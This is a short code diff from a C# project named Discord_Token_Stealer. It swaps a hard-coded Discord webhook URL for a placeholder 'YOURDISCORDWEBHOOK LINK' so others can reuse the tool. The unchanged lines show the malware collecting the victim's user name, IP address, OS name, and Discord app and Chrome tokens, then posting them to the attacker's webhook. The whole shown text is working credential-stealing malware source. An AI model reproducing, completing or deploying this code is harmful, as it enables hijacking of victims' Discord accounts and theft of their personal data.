@@ -44,7 +44,7 @@ namespace Discord_Token_Stealer
                     String OSName = managementObject["Caption"].ToString();
                     dcWeb.ProfilePicture = "https://www.logolynx.com/images/logolynx/1b/1bcc0f0aefe71b2c8ce66ffe8645d365.png";
                     dcWeb.UserName = "Webhook";
-                    dcWeb.WebHook = "https://discordapp.com/api/webhooks/593188878085652493/uM-LHOJqXLAgsYoB9tzHhfQ6pcLadLYi4tm3x2RUYQQv_O0hsp058jcbNYeFnFyB0Gl3";
+                    dcWeb.WebHook = "YOURDISCORDWEBHOOK LINK"; 
                     dcWeb.SendMessage("```" + "UserName: " + Environment.UserName + Environment.NewLine + "IP: " + GetIPAddress() + Environment.NewLine + "OS: " + OSName + Environment.NewLine + "Token DiscordAPP: " + string2 + Environment.NewLine + "Token Chrome: " + string4 + "```");
                 }
             }
